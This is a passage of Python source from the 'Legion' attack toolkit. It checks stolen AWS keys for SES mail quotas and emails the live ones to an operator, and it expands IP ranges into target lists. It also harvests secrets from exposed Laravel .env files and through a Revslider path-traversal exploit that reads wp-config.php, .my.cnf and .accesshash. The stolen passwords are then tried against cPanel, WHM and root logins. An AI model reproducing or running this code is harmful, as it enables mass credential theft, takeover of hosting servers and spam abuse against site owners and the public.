							file_append('Legion_AWS/BAD sent.txt', f"{key}|{secret}|{region}|{response['Max24HourSend']}|{response['MaxSendRate']}|{response['SentLast24Hours']}\n")
					out += '\r\n'
			else:

				out += f"{red}[{fc}AWS Checker{red}] {res}{key}{fc}|{res}{secret}{fc}|{fc}{region}{red}|{gr}{response['Max24HourSend']}{red}|{gr}{response['MaxSendRate']}{red}|{gr}{response['SentLast24Hours']} [Empity]"
				if response['Max24HourSend'] == 200:
					file_append('Legion_AWS/LIMIT_Empty_From.txt', f"{key}|{secret}|{region}|{response['Max24HourSend']}|{response['MaxSendRate']}|{response['SentLast24Hours']} [Empity]\n")
				else:
					file_append('Legion_AWS/Empty_From.txt', f"{key}|{secret}|{region}|{response['Max24HourSend']}|{response['MaxSendRate']}|{response['SentLast24Hours']} [Empity]\n")
		except:

			out = f"{red}[{fc}AWS Checker{red}] {gr}RANGED{red} {res}{key}{fc}|{res}{secret}{fc}|{fc}{region}"
			file_append('Legion_AWS/ranged_aws.txt', f"{key}|{secret}|{region}\n")
	except:
		traceback.print_exc()
		out = f"{red}[{fc}AWS Checker{red}] DIE {res}{key}{fc}|{res}{secret}{fc}|{fc}{region}"
		file_append('Legion_AWS/Failed.txt', f"{key}|{secret}|{region}\n")
	finally:
		print(out)
		return

def maina():
	start = time.time()
	files = get_content(input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#'))
	liste = files.splitlines()
	liste = list(dict.fromkeys(liste))
	if not liste:
		print("File %s is not found" % input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#'))
		sys.exit()
	try:
		tread = int(input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#'))
	except:
		tread = 50
	mail = chunks([i.strip() for i in liste], tread)
	keycheck = []
	reglist = [
	'us-east-2',
	'us-east-1',
	'us-west-1',
	'us-west-2',
	'af-south-1',
	'ap-south-1',
	'ap-northeast-3',
	'ap-northeast-2',
	'ap-southeast-1',
	'ap-southeast-2',
	'ap-northeast-1',
	'ca-central-1',
	'cn-north-1',
	'cn-northwest-1',
	'eu-central-1',
	'eu-west-1',
	'eu-west-2',
	'eu-south-1',
	'eu-west-3',
	'eu-north-1',
	'me-south-1',
	'sa-east-1',
	'us-gov-east-1',
	'us-gov-west-1'
	]
	try:
		countsd = 0
		for email in mail:
			jumlah = len(email)
			print("\033[32m--[ Send {jumlah} ]--".format(jumlah=jumlah))
			threads = []
			for item in email:
				item = item.strip()
				cfgs = item.split('|')
				if len(cfgs) >= 3:
					for region in reglist:
						countsd += 1
						t = threading.Thread(target=check, args=(countsd, cfgs[0], cfgs[1], region.strip()))
						threads.append(t)
			if threads:
				for t in threads:
					t.start()
				for t in threads:
					t.join()
	finally:
		print("\033[32mDone...")
		elapsed_time = time.time() - start
		timer = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
		print("\033[32mTotal Time:\033[36m {timer}".format(timer=timer))

def chunks2(l, n):
	n = max(1, n)
	return (l[i:i+n] for i in range(0, len(l), n))

def check2(countsd, key, secret, region):
	try:
		out = ''
		client = boto3.client('ses', aws_access_key_id=key, aws_secret_access_key=secret, region_name=region)
		try:
			response = client.get_send_quota()
			frommail = client.list_identities()['Identities']
			if frommail:
				SUBJECT = "AWS Checker By Legion PRIV8 Tools"
				BODY_TEXT = "Key : {key}\r\nSecret: {secret}\r\nRegion: {region}\r\nLimit: {limit}\r\nRaw: {key}|{secret}|{region}\r\n".format(key=key, secret=secret, region=region, limit=response['Max24HourSend'])
				CHARSET = "UTF-8"
				_to = emailnow
				for _from in frommail:
					try:
						SENDER = _from
						if '@' not in SENDER:
							SENDER = 'noreply@' + SENDER
						resp = client.send_email(
							Destination={
								'ToAddresses': [
									_to,
								],
							},
							Message={
								'Body': {
									'Text': {
										'Charset': CHARSET,
										'Data': BODY_TEXT,
									},
								},
								'Subject': {
									'Charset': CHARSET,
									'Data': SUBJECT,
								},
							},
							Source=SENDER,
						)
						out += f"{gr}[{fc}Legion{gr}]{res} {gr}OK{red} {fc}[{gr}{key}{red}|{gr}{secret}{red}|{gr}{region}{red}|{yl}{limit}{fc}]|{gr}{maxsendrate}|{res}{last24}".format(key=key, secret=secret, region=region, limit=response['Max24HourSend'], maxsendrate=response['MaxSendRate'], last24=response['SentLast24Hours'])
						out += "|{identitis}|Email Sent".format(identitis=SENDER)
						file_append('Legion_AWS/Live.txt', f'{key}|{secret}|{region}[{limit}]|{maxsendrate}|{last24} - {identitis} Email Sent!\r\n')
						break
					except ClientError as e:
						out += f"{gr}[{fc}Legion{gr}]{res} {gr}OK{red} {fc}[{red}{key}{red}|{red}{secret}{red}|{red}{region}{red}|{yl}{limit}{fc}]|{gr}{maxsendrate}|{res}{last24}".format(key=key, secret=secret, region=region, limit=response['Max24HourSend'], maxsendrate=response['MaxSendRate'], last24=response['SentLast24Hours'])
						out += "|{identitis}|{error}".format(identitis=SENDER, error=e.response['Error']['Message'])
						file_append('Legion_AWS/BAD sent.txt', f'{key}|{secret}|{region}\r\n')
					out += '\r\n'
			else:
				out = f"{gr}[{fc}Legion{gr}]{res} {gr}OK {fc}[{red}{key}{red}|{red}{secret}{red}|{red}{region}{red}|{yl}{limit}{red}|{fc}{maxsendrate}{red}|{gr}{last24}{red}|{res}{identitis}".format(key=key, secret=secret, region=region, limit=response['Max24HourSend'], maxsendrate=response['MaxSendRate'], last24=response['SentLast24Hours'], identitis='[empty]')
				file_append('Legion_AWS/Empty_From.txt', f'{key}|{secret}|{region}[{limit}]|{maxsendrate}|{last24}|{identitis}\r\n')
		except:
			out = f"{gr}[{fc}Legion{gr}]{res}  {red}DIE {red}[{red}{key}{gr}|{red}{secret}{gr}|{red}{region}{red}]".format(key=key, secret=secret, region=region)
			file_append('Legion_AWS/BAD.txt', f'{key}|{secret}|{region}\r\n')
	except:
		traceback.print_exc()
		out = f"{gr}[{fc}Legion{gr}]{res} {yl}FAILED {red}[{red}{key}{yl}|{red}{secret}{yl}|{red}{region}{red}]".format(key=key, secret=secret, region=region)
		file_append('Legion_AWS/Failed.txt', f'{key}|{secret}|{region}\r\n')
	finally:
		print(out)
		return


def mainola():
	start = time.time()
	files = get_content(input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#'))
	liste = files.splitlines()
	liste = list(dict.fromkeys(liste))
	if not liste:
		print("File %s is not found" % input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#'))
		sys.exit()
	try:
		tread = int(input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#'))
	except:
		tread = 50
	mail = chunks2([i.strip() for i in liste], tread)
	keycheck = []
	try:
		countsd = 0
		for email in mail:
			jumlah = len(email)
			print("--[ Send {jumlah} ]--".format(jumlah=jumlah))
			threads = []
			for item in email:
				item = item.strip()
				cfgs = item.split('|')
				if len(cfgs) >= 3:
					if cfgs[0] not in keycheck:
						countsd += 1
						keycheck.append(cfgs[0])
						t = threading.Thread(target=check2, args=(countsd, cfgs[0], cfgs[1], cfgs[2]))
						threads.append(t)
			if threads:
				for t in threads:
					t.start()
				for t in threads:
					t.join()
	finally:
		print("Done...")
		elapsed_time = time.time() - start
		timer = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
		print("Total Time: {timer}".format(timer=timer))

def check3(countsd, key, secret, region):
	try:
		client = boto3.client('ses', aws_access_key_id=key, aws_secret_access_key=secret, region_name=region)
		try:
			response = client.get_send_quota()
			frommail = client.list_identities()['Identities']
			if frommail:
				out = f"{red}[{fc}AWS Checker{red}] {res}{key}{fc}|{res}{secret}{fc}|{fc}{region}{red}|{gr}{response['Max24HourSend']}{red}|{gr}{response['MaxSendRate']}{red}|{gr}{response['SentLast24Hours']} {','.join(frommail)}"
				file_append('Legion_AWS/Live.txt', f"{key}|{secret}|{region}|{response['Max24HourSend']}|{response['MaxSendRate']}|{response['SentLast24Hours']}|{','.join(frommail)} \n")

			else:
				out = f"{red}[{fc}AWS Checker{red}] {res}{key}{fc}|{res}{secret}{fc}|{fc}{region}{red}|{gr}{response['Max24HourSend']}{red}|{gr}{response['MaxSendRate']}{red}|{gr}{response['SentLast24Hours']} [Empity]"
				file_append('Legion_AWS/Empty_From.txt', f"{key}|{secret}|{region}|{response['Max24HourSend']}|{response['MaxSendRate']}|{response['SentLast24Hours']} [Empity]\n")
		except:
			out = f"{red}[{fc}AWS Checker{red}] {red}DIE{red} {res}{key}{fc}|{res}{secret}{fc}|{fc}{region}"
			file_append('Legion_AWS/BAD.txt', f"{key}|{secret}|{region}\n")
	except:
		traceback.print_exc()
		out = f"{red}[{fc}AWS Checker{red}] {red}FAILED{red} {res}{key}{fc}|{res}{secret}{fc}|{fc}{region}"
		file_append('Legion_AWS/Failed.txt', f"{key}|{secret}|{region}\n")
	finally:
		print(out)
		return

def mainalla():
	start = time.time()
	try:
		aws_key = input("\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[32;1mYour AWS KEY\033[31;1m]\n└─╼\033[32;1m#")
		aws_sec = input("\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP\033[31;1m]--\033[31;1m[\033[32;1mYour AWS SECRET\033[31;1m]\n└─╼\033[32;1m#")
		reglist = [
			'us-east-2',
			'us-east-1',
			'us-west-1',
			'us-west-2',
			'ap-south-1',
			'ap-southeast-1',
			'ca-central-1',
			'eu-central-1',
			'eu-west-1',
			'eu-west-2',
			'eu-south-1',
			'eu-west-3',
		]
		countsd = 0
		for region in reglist:
			countsd += 1
			check3(countsd, aws_key, aws_sec, region)

	finally:
		print("Done...")
		elapsed_time = time.time() - start
		timer = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
		print("Total Time: {timer}".format(timer=timer))


def gass20(ip):
    try:
        result = requests.get('https://www.threatcrowd.org/searchApi/v2/ip/report/?ip=' + ip, timeout=20)
        j = json.loads(result.text)
        if '{"response_code":"0"}' in result.text:
            print (f'{gr}[{red}{ntime()}{gr}] {red}{ip}{res} {fc}╾┄╼{yl}[{red}BAD{yl}]')
        else:
            print (f'{gr}[{red}{ntime()}{gr}] {ip}{res} {fc}╾┄╼ {mg}[{gr}LIVE{mg}]')

            for asu in j['resolutions']:
                open('Reverse/reversed.txt', 'a').write(str(asu['domain'] + '\n'))
                print (f'[{gr}Legion Reverse{yl}] {fc}Fetching {yl}=> {gr}{ip}{res} {fc}╾┄╼ {yl} {red}╾┄╼ {gr}'+str(asu['domain']))
                clean()


    except:
        pass

def ranga(url):
    try:
        host = url.strip()
        prefix = host.split('.')
        jancok = prefix[0] + '.' + prefix[1] + '.' + prefix[2]
        for i in range(256):
            ip = jancok + '.%d' % i
            gass20(ip)


    except:
        pass

def getips():
    global progres
    (ip, cidr) = input(f'{red}┌─{res}[{cy}Legion Priv8{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}IPV4{red}/{res}]\n{red}└─╼ {res}~{gr}# {res}').split('/')
    cidr = int(cidr)
    host_bits = 32 - cidr
    i = struct.unpack('>I', socket.inet_aton(ip))[0] # note the endianness
    start = (i >> host_bits) << host_bits # clear the host bits
    end = start | ((1 << host_bits) - 1)

    # excludes the first and last address in the subnet
    for i in range(start, end):
        gud = socket.inet_ntoa(struct.pack('>I',i))
        open('ipos.txt', 'a').write(gud+'\n')
        progres = progres + 1
        print(f'{mg}{progres} {red}┌─{res}[{gr}IP {yl}GRABBER{res}] {mg}─╼ {fc}[{red}IP{res}: {gr}{gud}{fc}]')


def envold(url,dom) :
    global progres
    progres = progres + 1
    try:
        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        }
        pathes = [".env"]
        for path in pathes:
            try:
                inj = url + path
                check_inj = requests.get(inj,headers=headers, allow_redirects=True, timeout=15).text
                if 'DB_PASSWORD' in check_inj:
                    passwords = []
                    print(f'{fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {gr}Laravel VULN')
                    Gethost = re.findall("DB_HOST=(.*)", check_inj)[0]
                    Getuser = re.findall("DB_USERNAME=(.*)", check_inj)[0]
                    Getpass = re.findall("DB_PASSWORD=(.*)", check_inj)[0]
                    Getdb = re.findall("DB_DATABASE=(.*)", check_inj)[0]
                    if 'DB2_PASSWORD' in check_inj :
                        Getpass2 = re.findall("DB2_PASSWORD=(.*)", check_inj)[0]
                        if '"' in Getpass2:
                            Getpass2 = Getpass2.replace('"', '')
                        if 'null' not in Getpass2 and Getpass2 != '':
                            passwords.append(Getpass2)
                    if '"' in Gethost:
                        Gethost = Gethost.replace('"', '')
                    if '"' in Getuser:
                        Getuser = Getuser.replace('"', '')
                    if '"' in Getpass:
                        Getpass = Getpass.replace('"', '')
                    if '"' in Getdb:
                        Getdb = Getdb.replace('"', '')
                    if 'null' not in Getpass and Getpass != '' :
                        passwords.append(Getpass)
                        open('Results/Valid_db-ssh.txt', 'a').write(url + '|22|'+ Getuser + '|' + '|' + Getpass+'\n')


                    if "DB_USERNAME=root" in check_inj:
                        ROOTU = re.findall('DB_USERNAME=(.*)', check_inj)[0]
                        ROOTP = re.findall('DB_PASSWORD=(.*)', check_inj)[0]
                        if '"' in ROOTU:
                            ROOTU = ROOTU.replace('"', '')
                        if '"' in ROOTP:
                            ROOTP = ROOTP.replace('"', '')
                        if 'null' not in ROOTP and ROOTP != '' :
                            print(f'{fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {gr}DB ROOT Found')
                            open('Results/Valid_DB-Roots-env.txt', 'a').write(dom + '|root|' + ROOTP + '\n')
                    if passwords and 'null' not in Getuser and Getuser != '' :
                        req = requests.session()
                        try:
                            checkcp = requests.get('https://' + dom + ':2083/login/',headers=headers, timeout=30).text
                        except:
                            try :
                                requests.packages.urllib3.disable_warnings()
                                checkcp = requests.get('https://' + dom + ':2083/login/',headers=headers, verify=False, timeout=30).text
                            except:
                                checkcp = 'xxxxxxxx'
                                pass
                        if 'cPanel' in checkcp :
                            if '_' in Getuser :
                                username = re.findall("(.*)_", Getuser)[0]
                            else :
                                username = Getuser
                            for password in passwords:
                                postlogin = {'user': username, 'pass': password, 'login_submit': 'Log in'}
                                try:
                                    login = req.post('https://' + dom + ':2083/login/',headers=headers,data=postlogin, timeout=30)
                                except:
                                    requests.packages.urllib3.disable_warnings()
                                    login = req.post('https://' + dom + ':2083/login/',headers=headers, verify=False, data=postlogin,timeout=30)
                                if 'filemanager' in login.text:
                                    print(f'{fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {gr}CPANEL Found')
                                    open('Results/!Valid_cPanels.txt', 'a').write('https://' + dom + ':2083|'+username+'|'+password+'\n')
                                    postloginWHM = {'user': username, 'pass': password, 'login_submit': 'Log in'}
                                    postloginRoot = {'user': 'root', 'pass': password, 'login_submit': 'Log in'}
                                    try:
                                        loginWHM = req.post('https://' + dom + ':2087/login/',headers=headers, data=postloginWHM, timeout=30)
                                    except:
                                        requests.packages.urllib3.disable_warnings()
                                        loginWHM = req.post('https://' + dom + ':2087/login/',headers=headers, verify=False, data=postloginWHM,timeout=30)
                                    if 'Account Functions' in loginWHM.text :
                                        print(f'{fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {gr}WHM Found')
                                        open('Results/!Valid_WHM.txt', 'a').write('https://' + dom + ':2087|'+username+'|'+password+'\n')
                                    try:
                                        loginRoot = req.post('https://' + dom + ':2087/login/',headers=headers, data=postloginRoot, timeout=30)
                                    except:
                                        requests.packages.urllib3.disable_warnings()
                                        loginRoot = req.post('https://' + dom + ':2087/login/',headers=headers, verify=False, data=postloginRoot,timeout=30)
                                    if 'Account Functions' in loginRoot.text :
                                        print(f'{fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {gr}SSH Found')
                                        open('Results/!Valid_root.txt', 'a').write('https://' + dom + ':2087|root|' + password + '\n')
                    break
                else :
                    print(f'[{gr}{str(progres)}{red}] {fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {red}BAD')
            except :
                print(f'[{gr}{str(progres)}{red}] {fc}[{res}{url}{fc}] {red}ERROR')
    except :
        print(f'[{gr}{str(progres)}{red}] {fc}[{res}{url}{fc}] {red}ERROR')
def wordpressold(url,dom) :
    try:
        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        }
        pathes = ["wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"]
        for path in pathes:
            try:
                inj = url + path
                check_inj = requests.get(inj,headers=headers, allow_redirects=True, timeout=15).text
                if 'DB_PASSWORD' in check_inj:
                    print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mRevslider''\n' )
                    Gethost = re.findall("'DB_HOST', '(.*)'", check_inj)
                    Getuser = re.findall("'DB_USER', '(.*)'", check_inj)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", check_inj)
                    Getdb = re.findall("'DB_NAME', '(.*)'", check_inj)
                    Getfix = re.findall("table_prefix  = '(.*)'", check_inj)
                    open('Result/db-wordpress.txt', 'a').write(' URL : '+url+'\n Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +'\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[0] + '\n' + ' Fix:   ' + Getfix[0] + '\n---------------------\n')
                    if 'localhost' not in Gethost[0] and '127.0.0.1' not in Gethost[0] and '.' in Gethost[0] :
                        try :
                            cmdWP(Gethost[0], Getuser[0],Getpass[0], Getdb[0], Getfix[0])
                        except:
                            pass
                    else :
                        try :
                            ip = socket.gethostbyname(dom)
                            cmdWP(ip, Getuser[0],Getpass[0], Getdb[0], Getfix[0])
                        except:
                            pass
                    try:
                        checkcp = requests.get('https://' + dom + ':2083/login/',headers=headers, timeout=30).text
                    except:
                        try :
                            requests.packages.urllib3.disable_warnings()
                            checkcp = requests.get('https://' + dom + ':2083/login/',headers=headers, verify=False, timeout=30).text
                        except:
                            checkcp = 'xxxxxxxx'
                            pass
                    if 'cPanel' in checkcp :
                        passwords = []
                        passwords.append(Getpass[0])
                        req = requests.session()
                        if '%2F' in inj :
                            inj_mycnf = inj.replace('wp-config.php', '..%2F.my.cnf')
                            inj_accesshash = inj.replace('wp-config.php', '..%2F.accesshash')
                            inj_username = inj.replace('wp-config.php', '..%2F.cpanel%2Fdatastore%2Fftp_LISTSTORE')
                        else :
                            inj_mycnf = inj.replace('wp-config.php','../.my.cnf')
                            inj_accesshash = inj.replace('wp-config.php', '../.accesshash')
                            inj_username = inj.replace('wp-config.php', '../.cpanel/datastore/ftp_LISTSTORE')
                        ini_env = inj.replace('wp-config.php', '.env')
                        check_inj_mycnf = requests.get(inj_mycnf, timeout=15).text
                        check_inj_accesshash = requests.get(inj_accesshash, timeout=15).text
                        check_inj_username = requests.get(inj_username, timeout=15).text
                        check_ini_env = requests.get(ini_env, timeout=15).text
                        if 'MAIL_HOST' in check_ini_env:
                            SMTP_env = re.findall('MAIL_HOST=(.*)', check_ini_env)[0]
                            PORT_env = re.findall('MAIL_PORT=(.*)', check_ini_env)[0]
                            USERNAME_env = re.findall('MAIL_USERNAME=(.*)', check_ini_env)[0]
                            PASSWORD_env = re.findall('MAIL_PASSWORD=(.*)', check_ini_env)[0]
                            if '"' in SMTP_env :
                                SMTP_env = SMTP_env.replace('"', '')
                            if '"' in PORT_env :
                                PORT_env = PORT_env.replace('"', '')
                            if '"' in USERNAME_env :
                                USERNAME_env = USERNAME_env.replace('"', '')
                            if '"' in PASSWORD_env :
                                PASSWORD_env = PASSWORD_env.replace('"', '')
                            if 'null' not in PASSWORD_env :
                                passwords.append(PASSWORD_env)
                            if 'null' not in PASSWORD_env and PASSWORD_env != '' :
                                passwords.append(PASSWORD_env)
                            if "smtp.mailtrap.io" not in SMTP_env and "mailtrap.io" not in SMTP_env and "gmail.com" not in SMTP_env and 'localhost' not in SMTP_env and 'null' not in SMTP_env and 'null' not in PASSWORD_env and PASSWORD_env != '':
                                print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mSMTP''\n' )
                                open('Result/SMTPs-WP.txt', 'a').write(SMTP_env + '|'+PORT_env+'|'+USERNAME_env+'|'+PASSWORD_env+'\n')
                        elif 'SMTP_HOST' in check_ini_env:
                            SMTP_env = re.findall('SMTP_HOST=(.*)', check_ini_env)[0]
                            PORT_env = re.findall('SMTP_PORT=(.*)', check_ini_env)[0]
                            USERNAME_env = re.findall('SMTP_USERNAME=(.*)', check_ini_env)[0]
                            PASSWORD_env = re.findall('SMTP_PASSWORD=(.*)', check_ini_env)[0]
                            if '"' in SMTP_env :
                                SMTP_env = SMTP_env.replace('"', '')
                            if '"' in PORT_env :
                                PORT_env = PORT_env.replace('"', '')
                            if '"' in USERNAME_env :
                                USERNAME_env = USERNAME_env.replace('"', '')
                            if '"' in PASSWORD_env :
                                PASSWORD_env = PASSWORD_env.replace('"', '')
                            if 'null' not in PASSWORD_env :
                                passwords.append(PASSWORD_env)
                            if 'null' not in PASSWORD_env and PASSWORD_env != '' :
                                passwords.append(PASSWORD_env)
                            if "smtp.mailtrap.io" not in SMTP_env and "mailtrap.io" not in SMTP_env and "gmail.com" not in SMTP_env and 'localhost' not in SMTP_env and 'null' not in SMTP_env and 'null' not in PASSWORD_env and PASSWORD_env != '':
                                print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mSMTP''\n' )
                                open('Result/SMTPs-WP.txt', 'a').write(SMTP_env + '|'+PORT_env+'|'+USERNAME_env+'|'+PASSWORD_env+'\n')
                        if 'DB_PASSWORD' in check_ini_env:
                            DB_PASSWORD = re.findall('DB_PASSWORD=(.*)', check_ini_env)[0]
                            if '"' in DB_PASSWORD :
                                DB_PASSWORD = DB_PASSWORD.replace('"', '')
                            if 'null' not in DB_PASSWORD :
                                passwords.append(DB_PASSWORD)
                            if "DB_USERNAME=root" in check_ini_env :
                                ROOTU = re.findall('DB_USERNAME=(.*)', check_ini_env)[0]
                                ROOTP = re.findall('DB_PASSWORD=(.*)', check_ini_env)[0]
                                if '"' in ROOTU:
                                    ROOTU = ROOTU.replace('"', '')
                                if '"' in ROOTP:
                                    ROOTP = ROOTP.replace('"', '')
                                if 'null' not in ROOTP and ROOTP != '' :
                                    print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mVPS/ROOT''\n' )
                                    open('Result/DB-Roots-WP.txt', 'a').write(dom + '|root|' + ROOTP + '\n')
                        if re.findall('password="(.*)"', check_inj_mycnf) :
                            passwd = re.findall('password="(.*)"', check_inj_mycnf)[0]
                            passwords.append(passwd)
                        elif re.findall('password=(.*)', check_inj_mycnf) :
                            passwd = re.findall('password=(.*)', check_inj_mycnf)[0]
                            passwords.append(passwd)
                        if re.findall('"user":"(.*)_logs"', check_inj_username) :
                            while re.findall('"user":"(.*)_logs"', check_inj_username):
                                check_inj_username = re.findall('"user":"(.*)_logs"', check_inj_username)[0]
                            username = str(check_inj_username)
                            username = username.split('"', 1)[0]
                        elif '_' in Getuser[0] :
                            username = re.findall("(.*)_", Getuser[0])[0]
                        else :
                            username = Getuser[0]
                        if check_inj_accesshash != '' and 'empty' not in check_inj_accesshash and '<' not in check_inj_accesshash and '>' not in check_inj_accesshash and 'Site currently under maintenance' not in check_inj_accesshash and 'file transfer failed' not in check_inj_accesshash:
                            print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mAccess HASH Conf!''\n' )
                            open('Result/!WHM-accesshash.txt', 'a').write('https://' + dom + ':2087\n' + username + '|\n'+check_inj_accesshash+'\n-------------------------------------\n')
                        for password in passwords:
                            postlogin = {'user': username, 'pass': password, 'login_submit': 'Log in'}
                            try:
                                login = req.post('https://' + dom + ':2083/login/',headers=headers, data=postlogin, timeout=30)
                            except:
                                requests.packages.urllib3.disable_warnings()
                                login = req.post('https://' + dom + ':2083/login/',headers=headers, verify=False, data=postlogin,timeout=30)
                            if 'filemanager' in login.text:
                                print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mCpanel''\n' )
                                open('Result/!cPanels.txt', 'a').write('https://' + dom + ':2083|'+username+'|'+password+'\n')
                                postloginWHM = {'user': username, 'pass': password, 'login_submit': 'Log in'}
                                postloginRoot = {'user': 'root', 'pass': password, 'login_submit': 'Log in'}
                                try:
                                    loginWHM = req.post('https://' + dom + ':2087/login/',headers=headers, data=postloginWHM, timeout=30)
                                except:
                                    requests.packages.urllib3.disable_warnings()
                                    loginWHM = req.post('https://' + dom + ':2087/login/',headers=headers, verify=False, data=postloginWHM,timeout=30)
                                if 'Account Functions' in loginWHM.text :
                                    print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mWHM / Reseller''\n' )
                                    open('Result/!Resellers-WHM.txt', 'a').write('https://' + dom + ':2087|'+username+'|'+password+'\n')
                                try:
                                    loginRoot = req.post('https://' + dom + ':2087/login/',headers=headers, data=postloginRoot, timeout=30)
                                except:
                                    requests.packages.urllib3.disable_warnings()
                                    loginRoot = req.post('https://' + dom + ':2087/login/',headers=headers, verify=False, data=postloginRoot,timeout=30)
                                if 'Account Functions' in loginRoot.text :
                                    print('\033[0m[\033[32m+\033[0m] '+url+' \033[32mYou Got\033[0m \033[32mVPS/ROOT''\n' )
                                    open('Result/!roots.txt', 'a').write('https://' + dom + ':2087|root|' + password + '\n')
                    break
                else :
                    print('\033[0m[\033[31m-\033[0m] '+url+' \033[33mChecking \033[31mExploit \033[31m | \033[36m Cpanels \033[31m| \033[36m WHM \033[31m | \033[36m VPS \033[31m | \033[36m SMTP''\n').format(fr,path)
            except :
                print('\033[0m[\033[31m-\033[0m] \033[31mThis \033[33mis Not\033[0m \033[36m[Revslider] => \033[31m'+ url +'\n').format(fr)
    except :
        print('\033[0m[\033[31m-\033[0m] \033[31mThis \033[33mis Not\033[0m \033[36m[Revslider] => \033[31m'+ url +'\n').format(fr)


# start OLD
def di_chckngntdold(url):
    try:
        text = '\x1b[32;1m#\x1b[0m' + url
        headers = {'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get((url + '/.env'), headers=headers, timeout=5, verify=False, allow_redirects=False).text
        exp = '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        if 'APP_KEY=' in str(get_source):
            get_aws(url + '/.env', str(get_source))
            get_ssh(url + '/.env', str(get_source))
            get_smtp(url + '/.env', str(get_source))
            get_smtp2(url + '/.env', str(get_source))
            get_nexmo(url + '/.env', str(get_source))
            get_twilio5(url + '/.env', str(get_source))
            get_twillio(url + '/.env', str(get_source))
            get_twillio3(url + '/.env', str(get_source))
            get_plivo(url + '/.env', str(get_source))
            get_onesignal(url + '/.env', str(get_source))
            get_twilio6(url + '/.env', str(get_source))
            get_database(url + '/.env', str(get_source))
            get_bain(url + '/.env', str(get_source))
            get_clicktell(url + '/.env', str(get_source))
            get_razo(url + '/.env', str(get_source))
            get_razo2(url + '/.env', str(get_source))
            get_mysql(url + '/.env', str(get_source))








        else:
            get_source3 = requests.post(url, data={'0x[]': 'androxgh0st'}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
            if '<td>APP_KEY</td>' in get_source3:
                get_aws(url, get_source3)
                get_ssh(url, get_source3)
                get_smtp(url, get_source3)
                get_smtp2(url, get_source3)
                get_nexmo(url, get_source3)
                get_twilio5(url, get_source3)
                get_twillio(url, get_source3)
                get_twillio3(url, get_source3)
                get_plivo(url, get_source3)
                get_onesignal(url, get_source3)
                get_twilio6(url, get_source3)
                get_database(url, get_source3)
                get_bain(url, get_source3)
                get_clicktell(url, get_source3)
                get_razo(url, get_source3)
                get_razo2(url, get_source3)
                get_mysql(url, get_source3)









            else:
                if 'https' not in url and 'APP_KEY=' not in str(get_source):
                    nurl = url.replace('http', 'https')
                    get_source2 = requests.get((nurl + '/.env'), headers=headers, timeout=5, verify=False, allow_redirects=False).text
